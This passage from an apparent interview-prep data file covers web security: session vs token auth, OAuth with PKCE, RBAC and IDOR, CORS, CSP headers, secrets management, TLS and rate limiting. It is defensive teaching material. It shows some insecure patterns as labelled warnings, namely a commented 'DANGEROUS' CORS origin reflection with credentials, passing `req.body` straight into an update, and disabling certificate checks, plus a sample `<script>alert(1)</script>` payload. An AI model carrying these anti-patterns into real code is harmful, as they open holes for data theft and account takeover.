      answer30: "With sessions, the server keeps login state in a store like Redis and the browser holds a random id in a cookie, so revoking is instant but every request needs a lookup. With tokens like JWT, the server signs the claims and verifies them without a lookup, which suits multiple services and mobile clients, but revocation is hard, so access tokens must be short-lived with refresh tokens. The transport, cookie or header, is a separate choice with its own CSRF and XSS trade-offs.",
      mistakes: [
        'Saying JWTs are "more secure" than sessions; they are different, not safer.',
        'Not regenerating the session id at login.',
        'Storing sessions in process memory with several server instances.',
        "Trap: 'How do you log out a JWT user?' Clearing the cookie on one device isn't revocation; revoke the refresh token server-side and keep access tokens short.",
      ],
      takeaway: 'Sessions: server state, easy revoke. Tokens: self-contained, easy to scale, hard to revoke.',
    },

    {
      id: 'oauth-oidc-pkce',
      title: 'OAuth 2.0, OpenID Connect, and PKCE',
      level: 'advanced',
      priority: 'good',
      frequency: 'common',
      summary: 'OAuth 2.0 delegates access (authorization); OpenID Connect adds login (identity). Use the authorization code flow with PKCE.',
      note: "Current guidance: the OAuth 2.0 Security Best Current Practice (RFC 9700, 2025) and the OAuth 2.1 draft both say to use the authorization code flow with PKCE for all clients, and drop the implicit and password grants.",
      what: [
        "**OAuth 2.0** lets a user give an app limited access to their data on another service without sharing their password. Example: 'Allow this app to read your Google Drive files'. The app gets an **access token** for that API.",
        "**OpenID Connect (OIDC)** is a layer on top of OAuth that adds login. Besides the access token, the app gets an **ID token** (a JWT) that says who the user is. 'Sign in with Google' is OIDC.",
        "**PKCE** (Proof Key for Code Exchange, said 'pixie') protects the authorization code from being stolen and used by someone else.",
      ],
      deeper: [
        "Authorization code flow with PKCE: (1) the app creates a random `code_verifier` and sends its SHA-256 hash, the `code_challenge`, plus a random `state`, when redirecting the user to the provider. (2) The user logs in and consents. (3) The provider redirects back with a short-lived `code`. (4) The app checks `state`, then exchanges `code` + `code_verifier` for tokens. The provider hashes the verifier and checks it matches the challenge, so an intercepted code is useless alone.",
        "`state` protects against CSRF on the callback; `nonce` (OIDC) ties the ID token to the login request to stop replay. Validate the ID token's signature, `iss`, `aud` and `exp`.",
        "Other flows: **client credentials** for service-to-service calls with no user. The **implicit** flow (tokens in the URL fragment) and **password** grant are deprecated. For SPAs, a common hardened pattern is a Backend-for-Frontend (BFF): your server does the OAuth exchange and gives the browser only an HttpOnly session cookie.",
        "Authorization vs authentication: an access token says 'this app may do X'; it is not proof of who the user is. Use the OIDC ID token or userinfo endpoint for identity.",
      ],
      why: "Integrations with Google, Microsoft, Dropbox or an ATS all use OAuth. Getting the flow wrong leaks tokens or lets attackers log in as someone else.",
      analogy: "A hotel key card. Reception (the provider) checks your ID once and gives you a card that opens only your room and the gym, and expires at checkout. OAuth is the key card; OIDC is reception also handing you a signed note saying who you are. PKCE is a secret phrase you agreed at reception, so a thief who grabs the card on the way can't activate it.",
      code: {
        lang: 'js',
        title: 'Building a PKCE login redirect (node pkce.mjs)',
        source: `import { randomBytes, createHash } from 'node:crypto';

// 1) Client makes a secret verifier and sends only its hash (the challenge)
const codeVerifier = randomBytes(32).toString('base64url');
const codeChallenge = createHash('sha256').update(codeVerifier).digest('base64url');
const state = randomBytes(16).toString('hex');

const authUrl = new URL('https://auth.example.com/authorize');
authUrl.search = new URLSearchParams({
  response_type: 'code',
  client_id: 'recruiter-web',
  redirect_uri: 'https://app.example.com/callback',
  scope: 'openid profile email',
  state,
  code_challenge: codeChallenge,
  code_challenge_method: 'S256',
});

console.log(codeVerifier.length, codeChallenge.length);
console.log(authUrl.searchParams.get('code_challenge_method'));
// 2) Later, the token request sends code + code_verifier; the server hashes the verifier
//    and checks it matches the challenge from step 1.
console.log(createHash('sha256').update(codeVerifier).digest('base64url') === codeChallenge);`,
      },
      output: "Prints `43 43`, `S256`, `true`. The verifier stays secret in the client; only its hash travels in the redirect URL. At token exchange the server re-hashes the verifier and the match proves the same client started the flow.",
      questions: [
        { q: 'What is the difference between OAuth 2.0 and OpenID Connect?', a: 'OAuth 2.0 is for authorization: giving an app limited access to an API. OIDC adds authentication on top, returning an ID token that says who the user is.' },
        { q: 'What problem does PKCE solve?', a: 'It stops a stolen authorization code from being exchanged for tokens. The client proves it started the flow by sending the original code_verifier that matches the code_challenge.' },
        { q: 'Which OAuth flow should a SPA or mobile app use?', a: 'Authorization code with PKCE. The implicit flow is deprecated. Many teams also use a backend-for-frontend so tokens never reach the browser.' },
        { q: 'What is the state parameter for?', a: 'A random value the client sends and checks on the callback, to prevent CSRF on the redirect and to make sure the response belongs to a login it started.' },
        { q: 'Which flow is used between two backend services?', a: 'Client credentials: the service authenticates with its own id and secret (or a key) to get an access token, with no user involved.' },
      ],
      answer30: "OAuth 2.0 is delegated authorization: an app gets an access token to call an API on the user's behalf without their password. OpenID Connect adds identity with a signed ID token, which is what 'Sign in with Google' uses. The recommended flow for everything is authorization code with PKCE: the client sends a hash of a secret verifier, and must present the verifier when exchanging the code, so a stolen code is useless. I also check state, validate the ID token's issuer, audience and expiry, and use client credentials for service-to-service.",
      mistakes: [
        'Using an access token as proof of identity instead of the ID token.',
        'Skipping the `state` check on the callback.',
        'Putting the client secret in frontend code.',
        'Loose redirect URI matching (wildcards), which lets attackers steal codes.',
        "Trap: 'Is PKCE only for mobile apps?' No. Current best practice uses PKCE for every client, including server-side web apps.",
      ],
      takeaway: 'OAuth = access, OIDC = identity; always authorization code + PKCE + state.',
    },

    {
      id: 'authorization-rbac-idor',
      title: 'Authorization: RBAC, ABAC, and IDOR',
      level: 'intermediate',
      priority: 'must',
      frequency: 'very common',
      summary: 'Authentication says who you are; authorization says what you may do. Check role and ownership on every request, or you get IDOR.',
      note: "On your resume: RBAC with 4 roles across 8 permission modules on Octagnt. See 'Cookie-based JWT auth with auto-renewal, and RBAC' in My Resume and Projects.",
      what: [
        "**Authorization** decides whether a logged-in user may do a specific action on a specific thing. It is A01 on the OWASP Top 10, the most common serious bug.",
        "**RBAC** (role-based access control): permissions are attached to roles (admin, recruiter, viewer) and users get roles. **ABAC** (attribute-based): rules use attributes of the user, the resource and the context, like 'a recruiter may edit a job if they belong to its department and it is not closed'.",
        "**IDOR** (insecure direct object reference): the API takes an id from the user (`/invoices/1043`) and returns the record without checking it belongs to them. Change the id to 1044 and you read someone else's invoice.",
      ],
      deeper: [
        "RBAC alone doesn't stop IDOR. 'Recruiter may read candidates' must become 'this recruiter may read this candidate', which needs an ownership or tenant check: include the owner or tenant in the query itself (`findOne({ _id, tenantId })`), so a wrong id simply finds nothing.",
        "Enforce on the server in one place (middleware plus a repository layer), deny by default, and test it. Hiding buttons in the UI is not authorization. Return 404 rather than 403 for records in another tenant so you don't reveal they exist.",
        "Watch for related bugs: mass assignment (`User.updateOne({ _id }, req.body)` lets a user set `role: 'admin'`; allowlist fields), privilege escalation via admin-only fields, and missing checks on less obvious routes like exports, file downloads and websockets. Unguessable ids (UUIDs) help, but are not a substitute for checks.",
        "ABAC or policy engines (CASL, Casbin, OPA) fit when rules depend on many attributes; RBAC with a permission matrix fits most SaaS apps.",
      ],
      why: "Authentication bugs are rare because libraries handle them; authorization bugs are everywhere because every endpoint needs its own check, and one missed check leaks data.",
      analogy: "An office building. Your badge gets you through the front door (authentication) and your role opens the right floor (RBAC). IDOR is when every filing cabinet on that floor is unlocked, so you can open any colleague's drawer just by reading the label.",
      code: {
        lang: 'ts',
        title: 'Role check + ownership in the query (Express + Mongoose)',
        source: `type Permission = 'candidates:read' | 'candidates:write' | 'billing:manage';
const ROLE_PERMISSIONS: Record<string, Permission[]> = {
  admin: ['candidates:read', 'candidates:write', 'billing:manage'],
  recruiter: ['candidates:read', 'candidates:write'],
  viewer: ['candidates:read'],
};

const can = (perm: Permission) => (req, res, next) =>
  ROLE_PERMISSIONS[req.user.role]?.includes(perm) ? next() : res.sendStatus(403);

// IDOR-safe: tenant AND id both in the filter; another tenant's id just finds nothing
app.get('/candidates/:id', auth, can('candidates:read'), async (req, res) => {
  const c = await Candidate.findOne({ _id: req.params.id, tenantId: req.user.tenantId }).lean();
  if (!c) return res.sendStatus(404);
  res.json(c);
});

// Mass-assignment safe: only allowlisted fields can be updated
app.patch('/candidates/:id', auth, can('candidates:write'), async (req, res) => {
  const { name, stage, notes } = req.body;     // role, tenantId, etc. are ignored
  const c = await Candidate.findOneAndUpdate(
    { _id: req.params.id, tenantId: req.user.tenantId },
    { $set: { name, stage, notes } },
    { new: true, runValidators: true },
  );
  if (!c) return res.sendStatus(404);
  res.json(c);
});`,
      },
      output: "A viewer calling PATCH gets 403 from the permission check. A recruiter from tenant A requesting tenant B's candidate id gets 404, because the query also requires tenant A. Sending `role` or `tenantId` in the PATCH body changes nothing, because only name, stage and notes are applied.",
      questions: [
        { q: 'Authentication vs authorization?', a: 'Authentication verifies who the user is (login). Authorization decides what that user may do on a specific resource, checked on every request.' },
        { q: 'What is IDOR and how do you prevent it?', a: 'Insecure direct object reference: an endpoint returns or changes a record by id without checking the caller owns it. Prevent it by putting the owner or tenant in the query itself and testing cross-user access.' },
        { q: 'RBAC vs ABAC?', a: 'RBAC grants permissions through roles, simple and easy to audit. ABAC evaluates rules on attributes of the user, resource and context, more flexible for rules like department or record status.' },
        { q: 'Is hiding a button in the UI enough?', a: 'No. Anyone can call the API directly with curl or devtools. Every rule must be enforced on the server.' },
        { q: 'What is mass assignment?', a: 'Passing the whole request body into an update, so a user can set fields like `role` or `tenantId`. Fix it by allowlisting which fields each endpoint may change.' },
      ],
      answer30: "Authentication is who you are; authorization is what you may do with this specific record. I use RBAC with a permission matrix checked in middleware, and for ownership I put the tenant or owner id in the database query itself, so another user's id just returns 404. That prevents IDOR, the classic bug where changing an id in the URL shows someone else's data. I also allowlist updatable fields to stop mass assignment, deny by default, and write tests for cross-user access.",
      mistakes: [
        'Checking the role but not ownership or tenant.',
        'Fetching the record first and comparing ownership later, then forgetting it on one route.',
        'Passing `req.body` straight into an update.',
        'Trusting a `userId` or `tenantId` sent by the client.',
        "Trap: 'We use UUIDs, so IDOR isn't possible?' UUIDs are hard to guess but leak through URLs, logs and shared links. You still need the check.",
      ],
      takeaway: 'Check role and ownership on every request, inside the query, on the server.',
    },

    {
      id: 'cors',
      title: 'CORS and its common misconceptions',
      level: 'intermediate',
      priority: 'must',
      frequency: 'very common',
      summary: "CORS is the browser relaxing the same-origin policy when your server says so. It does not protect your API from attackers.",
      what: [
        "Browsers follow the **same-origin policy**: JavaScript on `https://app.com` can't read responses from `https://api.other.com`. An origin is scheme + host + port.",
        "**CORS** (Cross-Origin Resource Sharing) is how a server opts in: it sends headers like `Access-Control-Allow-Origin: https://app.com`, and the browser then lets that page read the response.",
      ],
      deeper: [
        "Misconception 1: 'CORS secures my API.' No. CORS is enforced only by browsers. curl, Postman, scripts and servers ignore it. Your API still needs authentication and authorization.",
        "Misconception 2: 'CORS blocks the request.' For simple requests (GET, or POST with form-type content), the browser sends the request and the server runs it; CORS only blocks JavaScript from reading the response. That's why CORS does not stop CSRF. For other requests (PUT, DELETE, JSON content type, custom headers) the browser first sends an `OPTIONS` **preflight**, and only sends the real request if the server allows it.",
        "Misconception 3: 'Just use `*`.' `Access-Control-Allow-Origin: *` cannot be combined with credentials (cookies). The dangerous 'fix' is reflecting whatever `Origin` arrives together with `Access-Control-Allow-Credentials: true`; that lets any website make authenticated requests and read the results. Use an explicit allowlist, and add `Vary: Origin` when the header changes per origin.",
        "A CORS error in the console is a browser message; the fix is always on the server's response headers (or a same-origin proxy in development), never in frontend code.",
      ],
      why: "CORS errors are the most common frontend-backend integration problem, and wrong 'fixes' can open a real hole. Interviewers want to hear that you know what it protects and what it doesn't.",
      analogy: "A building's visitor policy that only the reception desk enforces. Visitors who come through reception (browsers) get checked against the guest list. Someone climbing in through a window (curl) never sees reception, so you still need locks on the doors (auth).",
      code: {
        lang: 'js',
        title: 'Strict CORS with the cors package (Express)',
        source: `import cors from 'cors';

const ALLOWED_ORIGINS = ['https://app.octagnt.example', 'http://localhost:5173'];

app.use(cors({
  origin(origin, cb) {
    // No Origin header: same-origin or non-browser client (still needs auth!)
    if (!origin || ALLOWED_ORIGINS.includes(origin)) return cb(null, true);
    cb(null, false); // no CORS headers -> the browser blocks reading the response
  },
  credentials: true,                      // allow cookies; requires a specific origin, not *
  methods: ['GET', 'POST', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'X-CSRF-Token'],
  maxAge: 600,                            // cache preflight results for 10 minutes
}));

// DANGEROUS: never do this
// res.set('Access-Control-Allow-Origin', req.get('Origin'));
// res.set('Access-Control-Allow-Credentials', 'true');`,
      },
      output: "A fetch from the app's origin with `credentials: 'include'` succeeds. The same fetch from another site gets a response without CORS headers, so the browser throws a CORS error and the script can't read the data. The same request from curl still reaches the API, which is why auth checks are still required.",
      questions: [
        { q: 'What is CORS?', a: 'A browser mechanism that lets a server allow specific other origins to read its responses, relaxing the same-origin policy through headers like Access-Control-Allow-Origin.' },
        { q: 'Does CORS protect your API?', a: 'No. Only browsers enforce it; curl and scripts ignore it, and simple requests still reach the server. Authentication and authorization protect the API.' },
        { q: 'What is a preflight request?', a: 'An automatic OPTIONS request the browser sends before non-simple requests (like PUT, DELETE, JSON bodies or custom headers) to ask whether the real request is allowed.' },
        { q: 'Why can\'t you use * with cookies?', a: 'Browsers reject `Access-Control-Allow-Origin: *` when credentials are included. You must return a specific allowed origin, ideally from an allowlist.' },
        { q: 'Does CORS stop CSRF?', a: 'No. A cross-site form POST is a simple request; it is sent and executed, and CORS only stops the attacker from reading the response. Use SameSite cookies and CSRF tokens or origin checks.' },
      ],
      answer30: "CORS is the browser relaxing the same-origin policy when the server's response headers allow another origin. It's not API security: only browsers enforce it, and simple requests still reach the server; CORS just stops the page from reading the response. Non-simple requests get an OPTIONS preflight first. I use an explicit origin allowlist, credentials only with specific origins, never reflect arbitrary origins, and keep real protection in authentication, authorization and CSRF defences.",
      mistakes: [
        'Reflecting any Origin with credentials enabled.',
        'Trying to fix CORS errors from the frontend (for example `mode: "no-cors"`, which just gives an unreadable response).',
        'Forgetting that the error handler and 404 responses also need CORS headers, so real errors show up as confusing CORS errors.',
        "Trap: 'Postman works but the browser fails, so the API is broken?' No. Postman ignores CORS; the server is missing the right CORS headers for that origin.",
      ],
      takeaway: 'CORS lets browsers read cross-origin responses; it is not authentication and not CSRF protection.',
    },

    {
      id: 'security-headers-csp',
      title: 'Security headers and Content Security Policy',
      level: 'intermediate',
      priority: 'good',
      frequency: 'common',
      summary: 'HTTP headers tell the browser to enforce extra protections: CSP limits where scripts load from, HSTS forces HTTPS, others stop sniffing and framing.',
      what: [
        "Security headers are instructions your server sends with each response, telling the browser to turn on protections. In Express, the `helmet` package sets a sensible bundle with one line.",
        "The most important is **Content-Security-Policy (CSP)**: a list of where scripts, styles, images and connections may come from. If an XSS payload tries to run an inline script or load one from evil.com, the browser refuses.",
      ],
      deeper: [
        "Key headers: `Strict-Transport-Security` (HSTS) makes the browser use HTTPS for your domain for a set time; `X-Content-Type-Options: nosniff` stops the browser guessing file types (so an uploaded 'image' isn't run as script); `frame-ancestors` in CSP (or the older `X-Frame-Options`) blocks clickjacking by forbidding other sites from framing yours; `Referrer-Policy` limits URL leakage; `Permissions-Policy` turns off features like camera or geolocation you don't use. Remove `X-Powered-By` so you don't advertise Express.",
        "A strong CSP avoids `'unsafe-inline'` for scripts. Use nonces (a random value per response added to each allowed `<script>`) or hashes, optionally with `'strict-dynamic'`. Roll out with `Content-Security-Policy-Report-Only` first to collect violations without breaking the site, then enforce.",
        "Headers are defence in depth, not a replacement for escaping and validation. `X-XSS-Protection` is obsolete; helmet sets it to 0 because the old browser filter caused its own bugs.",
      ],
      why: "A single XSS or clickjacking bug becomes much harder to exploit when the browser itself refuses to run unknown scripts or render your page inside an attacker's frame.",
      analogy: "House rules posted at the door for the browser: 'Only staff from these agencies may enter (CSP), always use the front door with the lock (HSTS), and nobody may put our shop window inside their shop (frame-ancestors).'",
      code: {
        lang: 'js',
        title: 'helmet with a custom CSP (Express)',
        source: `import helmet from 'helmet';
import crypto from 'node:crypto';

app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString('base64'); // new nonce per response
  next();
});

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", (req, res) => \`'nonce-\${res.locals.cspNonce}'\`],
      connectSrc: ["'self'", 'https://api.octagnt.example'],
      imgSrc: ["'self'", 'data:', 'https://*.amazonaws.com'],
      objectSrc: ["'none'"],
      frameAncestors: ["'none'"],          // nobody may frame us (clickjacking)
    },
  },
  strictTransportSecurity: { maxAge: 31536000, includeSubDomains: true }, // 1 year
}));
// Templates then use: <script nonce="<%= cspNonce %>" src="/app.js"></script>`,
      },
      output: "Every response carries a CSP, HSTS, nosniff, a referrer policy and more, and no X-Powered-By. An injected `<script>alert(1)</script>` without the nonce is blocked by the browser and logged in the console as a CSP violation.",
      questions: [
        { q: 'What is Content Security Policy?', a: 'A response header listing allowed sources for scripts, styles, images, connections and frames. The browser blocks anything else, which limits the impact of XSS.' },
        { q: 'What does HSTS do?', a: 'It tells the browser to only use HTTPS for the domain for a set period, preventing downgrade attacks and accidental plain HTTP requests.' },
        { q: 'How do you prevent clickjacking?', a: 'Send CSP `frame-ancestors \'none\'` (or a list of allowed parents), or the older `X-Frame-Options: DENY`, so other sites can\'t embed your page in an invisible frame.' },
        { q: 'How do you roll out CSP without breaking the site?', a: 'Start with Content-Security-Policy-Report-Only to collect violations, fix or allowlist legitimate sources, then switch to the enforcing header.' },
      ],
      answer30: "Security headers make the browser enforce extra rules. In Express I use helmet: Content-Security-Policy restricts where scripts and other resources load from, so injected scripts don't run; HSTS forces HTTPS; nosniff stops MIME sniffing; frame-ancestors blocks clickjacking; and it removes X-Powered-By. For CSP I avoid unsafe-inline, use nonces, and roll out in report-only mode first. Headers are defence in depth on top of escaping and validation.",
      mistakes: [
        "A CSP with `'unsafe-inline'` and `*` that blocks nothing.",
        'Enforcing a new CSP straight to production without report-only testing.',
        'Setting HSTS with `preload` before every subdomain supports HTTPS.',
        "Trap: 'Should I set X-XSS-Protection: 1?' No. It's obsolete and could introduce issues; modern advice is to disable it and rely on CSP.",
      ],
      takeaway: 'helmet for the basics, a nonce-based CSP for XSS, HSTS for HTTPS, frame-ancestors for clickjacking.',
    },

    {
      id: 'secrets-management',
      title: 'Secrets management',
      level: 'intermediate',
      priority: 'must',
      frequency: 'common',
      summary: 'Keep secrets out of code and images, load them at runtime from a secrets manager, give each one least privilege, and rotate them.',
      what: [
        "Secrets are values that grant access: database passwords, JWT signing keys, API keys, AWS credentials. They must never be committed to Git, baked into Docker images, or shipped in frontend bundles.",
        "Locally, a `.env` file (git-ignored) is fine. In production, load secrets at runtime from a secrets manager such as AWS Secrets Manager or SSM Parameter Store, injected as environment variables or fetched at startup.",
      ],
      deeper: [
        "On AWS, prefer IAM roles over access keys: an ECS task role or EC2 instance profile gives temporary credentials automatically, so there is no long-lived key to leak. Grant each service only the secrets and actions it needs.",
        "Anything in a frontend bundle is public, including `VITE_` or `NEXT_PUBLIC_` variables. Frontends can hold publishable keys only; secret keys stay on the server.",
        "If a secret leaks (pushed to GitHub, pasted in a log): rotate it immediately, then remove it from history. Deleting the commit is not enough because it may already be cloned or scraped by bots within minutes. Use secret scanning (GitHub push protection, gitleaks in a pre-commit hook) to block leaks before they happen.",
        "Rotation is easier when code reads secrets at runtime and supports two valid keys during a changeover (for example accepting JWTs signed by the old and new key, identified by `kid`).",
      ],
      why: "Leaked credentials are one of the most common causes of real breaches, and bots scan public repos for keys continuously. Good handling limits both the chance and the damage of a leak.",
      analogy: "House keys. You don't tape them to the front door (code), you don't post copies to every visitor (frontend bundle), you give the cleaner a key that only opens the kitchen (least privilege), and if one goes missing you change the locks (rotation), not just ask for it back.",
      code: [
        {
          lang: 'ts',
          title: 'Load secrets at startup from AWS Secrets Manager (role-based credentials)',
          source: `import { SecretsManagerClient, GetSecretValueCommand } from '@aws-sdk/client-secrets-manager';

// No access keys in code: the SDK picks up the ECS task role / instance profile automatically
const sm = new SecretsManagerClient({ region: process.env.AWS_REGION });

export async function loadSecrets() {
  const { SecretString } = await sm.send(new GetSecretValueCommand({ SecretId: 'octagnt/prod/api' }));
  const s = JSON.parse(SecretString!);
  if (!s.JWT_SECRET || s.JWT_SECRET.length < 32) throw new Error('JWT_SECRET missing or too short');
  return s as { MONGO_URI: string; JWT_SECRET: string; OPENAI_API_KEY: string };
}`,
        },
        {
          lang: 'bash',
          title: 'Guard rails',
          source: `# .gitignore
.env
.env.*

# Scan the repo (and history) for committed secrets
gitleaks detect --source . --verbose`,
        },
      ],
      output: "The service starts, fetches its secrets using its IAM role, and fails fast with a clear error if the JWT secret is missing or weak. No secret appears in the repo, the image or the frontend bundle.",
      questions: [
        { q: 'How do you manage secrets in a Node app?', a: 'Local `.env` files that are git-ignored for development, and a secrets manager like AWS Secrets Manager or SSM in production, loaded at runtime. Services get access through IAM roles with least privilege.' },
        { q: 'What do you do if a secret is committed to GitHub?', a: 'Rotate it immediately, since bots may already have it, then purge it from history and check logs for misuse. Add secret scanning so it doesn\'t happen again.' },
        { q: 'Can you put an API key in a React environment variable?', a: 'Only a publishable one. Everything in the frontend bundle is visible to users, so secret keys must stay on the server behind your own API.' },
        { q: 'Why prefer IAM roles over access keys?', a: 'Roles give short-lived credentials that rotate automatically, so there is no long-lived key to leak or forget to rotate.' },
      ],
      answer30: "Secrets never go in code, Docker images or frontend bundles. Locally I use a git-ignored .env; in production I load them at runtime from AWS Secrets Manager or SSM, and services authenticate with IAM roles instead of access keys, each with least privilege. I add secret scanning to block commits with keys, and if something leaks, the first step is rotating it, because deleting the commit doesn't help once bots have scraped it.",
      mistakes: [
        'Committing `.env` or hard-coding keys "just for now".',
        'Putting secret keys in `VITE_` or `NEXT_PUBLIC_` variables.',
        'Logging the whole `process.env` or config object at startup.',
        "Trap: 'We deleted the commit, are we safe?' No. Rotate the secret first; history and forks may still have it.",
      ],
      takeaway: 'Runtime secrets from a manager, IAM roles over keys, least privilege, rotate on any leak.',
    },

    {
      id: 'https-tls',
      title: 'HTTPS and TLS basics',
      level: 'basic',
      priority: 'good',
      frequency: 'common',
      summary: "TLS encrypts traffic, proves the server's identity with a certificate, and detects tampering. HTTPS is HTTP over TLS.",
      what: [
        "HTTPS is HTTP sent inside a TLS (Transport Layer Security) connection. TLS gives three things: **encryption** (nobody on the network can read the data), **integrity** (nobody can change it unnoticed), and **authentication** (the certificate proves you are talking to the real server).",
        "A certificate is issued by a Certificate Authority (CA) that the browser trusts. It binds a domain name to a public key.",
      ],
      deeper: [
        "Handshake in plain words (TLS 1.3): the client says hello with supported options and a key share; the server replies with its key share and certificate; both derive the same session keys using an ephemeral Diffie-Hellman exchange; from then on data is encrypted with fast symmetric encryption. TLS 1.3 needs one round trip; TLS 1.2 needed two. Ephemeral keys give forward secrecy: stealing the server's private key later doesn't decrypt old recorded traffic.",
        "Asymmetric cryptography (public/private keys) is used to authenticate and agree on keys; symmetric cryptography (like AES-GCM) encrypts the actual data because it's much faster.",
        "In a typical AWS setup, TLS terminates at the load balancer (ALB or CloudFront) with an ACM certificate; traffic inside the VPC may be plain HTTP or re-encrypted, depending on compliance needs. Express then needs `app.set('trust proxy', 1)` so `req.secure` and client IPs are correct.",
        "Only TLS 1.2 and 1.3 should be enabled; TLS 1.0 and 1.1 are deprecated. HSTS stops downgrade to HTTP.",
      ],
      why: "Without TLS, anyone on the same Wi-Fi, ISP or proxy can read passwords and tokens, or inject content. Secure cookies, HSTS and many browser features only work over HTTPS.",
      analogy: "Sending a letter in a locked box. First you check the courier's official ID (certificate), then you agree a secret combination nobody else overhears (key exchange), and every letter after that travels locked (symmetric encryption).",
      code: {
        lang: 'bash',
        title: 'Inspect a site\'s TLS from the terminal',
        source: `# Show the negotiated protocol, cipher and certificate chain
openssl s_client -connect example.com:443 -servername example.com </dev/null 2>/dev/null \\
  | grep -E 'Protocol|Cipher|subject=|issuer='

# See the HSTS header
curl -sI https://example.com | grep -i strict-transport-security`,
      },
      output: "The first command prints the negotiated protocol (for example TLSv1.3), the cipher suite, and the certificate's subject and issuer. The second shows whether the site sends an HSTS header. Exact values depend on the site.",
      questions: [
        { q: 'What does TLS provide?', a: 'Encryption so traffic can\'t be read, integrity so it can\'t be changed unnoticed, and server authentication through a CA-signed certificate.' },
        { q: 'Briefly, how does the TLS handshake work?', a: 'Client and server agree on a version and cipher, the server proves its identity with its certificate, and both derive shared session keys with an ephemeral Diffie-Hellman exchange. Then data is encrypted symmetrically.' },
        { q: 'Why use both asymmetric and symmetric encryption?', a: 'Asymmetric crypto solves identity and key agreement but is slow. Symmetric crypto is fast, so it encrypts the actual data once both sides share a key.' },
        { q: 'What is TLS termination?', a: 'Decrypting HTTPS at a load balancer or proxy, which then forwards traffic to the app. The app must trust the proxy\'s forwarded headers to know the original protocol and client IP.' },
      ],
      answer30: "HTTPS is HTTP inside TLS. TLS encrypts the traffic, detects tampering, and proves the server's identity with a certificate signed by a trusted CA. In the handshake, the server presents its certificate and both sides derive session keys with ephemeral Diffie-Hellman, which gives forward secrecy; after that, fast symmetric encryption protects the data. On AWS I'd terminate TLS at the load balancer with an ACM certificate, enable only TLS 1.2 and 1.3, and add HSTS.",
      mistakes: [
        "Saying HTTPS hides which site you visit; the domain is still visible through DNS and the TLS SNI field unless extra measures like Encrypted Client Hello are used.",
        'Disabling certificate checks (`rejectUnauthorized: false`) to make an error go away.',
        'Forgetting `trust proxy` behind a load balancer, which breaks secure cookies and IP-based rate limits.',
        "Trap: 'Is the data encrypted with the server's public key?' Not in modern TLS. The keys are agreed with ephemeral Diffie-Hellman; the certificate's key only signs to prove identity.",
      ],
      takeaway: 'TLS = encryption + integrity + identity; terminate at the load balancer, TLS 1.2+ only, add HSTS.',
    },

    {
      id: 'rate-limiting',
      title: 'Rate limiting and brute-force protection',
      level: 'intermediate',
      priority: 'must',
      frequency: 'common',
      summary: 'Limit how many requests a client can make in a time window, per IP and per account, with a shared store so every server agrees.',
      what: [
        "Rate limiting caps how many requests a client may make in a time window, like 5 login attempts per 15 minutes. Extra requests get HTTP **429 Too Many Requests** with a `Retry-After` header.",
        "It protects against brute-force password guessing, credential stuffing (trying leaked email/password pairs), scraping, and accidental or deliberate overload.",
      ],
      deeper: [
        "Algorithms: **fixed window** (simple counter per window; allows bursts at window edges), **sliding window** (smoother), and **token bucket** (allows short bursts up to a bucket size, refilling at a steady rate). Most APIs use token bucket or sliding window.",
        "Key choice matters. Per IP alone fails against botnets and punishes shared office IPs. For login, limit per account and per IP separately, and add progressive delays or CAPTCHA after several failures instead of hard lockouts that attackers can abuse to lock real users out.",
        "With several server instances, counters must live in a shared store like Redis, or each instance counts separately. Behind a load balancer, set Express `trust proxy` correctly, or every request appears to come from the balancer's IP. Also consider limits at the edge (AWS WAF, API Gateway throttling, CloudFront) so floods never reach Node.",
        "Expensive endpoints need their own, stricter limits: login, password reset, OTP verification, file uploads, and AI calls that cost money per request.",
      ],
      why: "Without limits, an attacker can try millions of passwords, and a single client can exhaust your database or your AI API budget.",
      analogy: "A bank ATM that swallows the card after three wrong PINs, and a teller who serves each customer only so many times an hour so one person can't block the queue.",
      code: [
        {
          lang: 'js',
          title: 'A fixed-window limiter, run with a fake clock (node rate.mjs)',
          source: `// In-memory for the demo; in production use Redis so all instances share counts.
function createLimiter({ max, windowMs, now = Date.now }) {
  const hits = new Map(); // key -> { count, resetAt }
  return function check(key) {
    const t = now();
    let entry = hits.get(key);
    if (!entry || t >= entry.resetAt) {
      entry = { count: 0, resetAt: t + windowMs };
      hits.set(key, entry);
    }
    entry.count++;
    const allowed = entry.count <= max;
    return { allowed, remaining: Math.max(0, max - entry.count), retryAfterSec: allowed ? 0 : Math.ceil((entry.resetAt - t) / 1000) };
  };
}

let fakeNow = 0;
const loginLimiter = createLimiter({ max: 5, windowMs: 15 * 60_000, now: () => fakeNow });
const key = 'login:asha@example.com'; // per account, and separately per IP

for (let i = 1; i <= 6; i++) {
  const r = loginLimiter(key);
  console.log(\`attempt \${i}:\`, r.allowed ? \`allowed (\${r.remaining} left)\` : \`429, retry in \${r.retryAfterSec}s\`);
}
fakeNow += 15 * 60_000; // window passes
console.log('after 15 min:', loginLimiter(key).allowed ? 'allowed' : 'blocked');`,
        },
        {
          lang: 'js',
          title: 'In a real Express app (express-rate-limit + Redis store)',
          source: `import { rateLimit } from 'express-rate-limit';
import { RedisStore } from 'rate-limit-redis';

app.set('trust proxy', 1); // behind one load balancer: use the real client IP

app.use('/auth/login', rateLimit({
  windowMs: 15 * 60 * 1000,
  limit: 5,
  standardHeaders: 'draft-7',      // RateLimit headers for clients
  legacyHeaders: false,
  store: new RedisStore({ sendCommand: (...args) => redis.sendCommand(args) }),
}));`,
        },
      ],
      output: "Attempts 1-5 are allowed with 4, 3, 2, 1, 0 left. Attempt 6 is refused: `429, retry in 900s`. After the 15-minute window passes, the next attempt is allowed again.",
      questions: [
        { q: 'How do you protect a login endpoint from brute force?', a: 'Rate-limit per account and per IP, add progressive delays or CAPTCHA after repeated failures, use generic error messages, support MFA, and alert on spikes of failures.' },
        { q: 'Why does an in-memory rate limiter break with several servers?', a: 'Each instance keeps its own counter, so a client gets the limit multiplied by the number of instances. Use a shared store like Redis.' },
        { q: 'Fixed window vs token bucket?', a: 'Fixed window counts requests per time block and allows bursts at block edges. Token bucket refills tokens at a steady rate and allows controlled bursts up to the bucket size, giving smoother limits.' },
        { q: 'What status code and headers should a rate-limited response use?', a: '429 Too Many Requests, with Retry-After so clients know when to try again, and optionally RateLimit headers showing the limit and remaining requests.' },
      ],
